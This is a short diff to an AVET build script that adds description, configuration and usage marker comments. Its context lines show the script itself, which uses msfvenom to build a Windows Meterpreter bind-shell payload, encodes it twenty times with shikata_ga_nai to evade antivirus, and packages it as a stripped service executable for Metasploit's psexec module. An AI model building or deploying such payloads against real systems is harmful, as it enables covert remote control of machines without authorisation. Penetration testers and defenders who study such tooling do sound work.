@@ -1,5 +1,9 @@
 #!/bin/bash          
+
+
+#DESCRIPTION_START
 # Designed for use with msf psexec module!
+#DESCRIPTION_END
 
 # print AVET logo
 cat banner.txt
@@ -12,8 +16,12 @@ cat banner.txt
 # import global default lhost and lport values from build/global_connect_config.sh
 . build/global_connect_config.sh
 
+
+#CONFIGURATION_START
 # override connect-back settings here, if necessary
 LPORT=$GLOBAL_LPORT
+#CONFIGURATION_END
+
 
 # make meterpreter bind payload, encoded 20 rounds with shikata_ga_nai
 msfvenom -p windows/meterpreter/bind_tcp lport=$LPORT -e x86/shikata_ga_nai -i 20 -f raw -a x86 --platform Windows > input/sc_raw.txt
@@ -65,3 +73,8 @@ strip output/svc_20xshikata_bindtcp_win32.exe
 
 # cleanup
 cleanup_techniques
+
+
+#USAGE_START
+TODO
+#USAGE_END
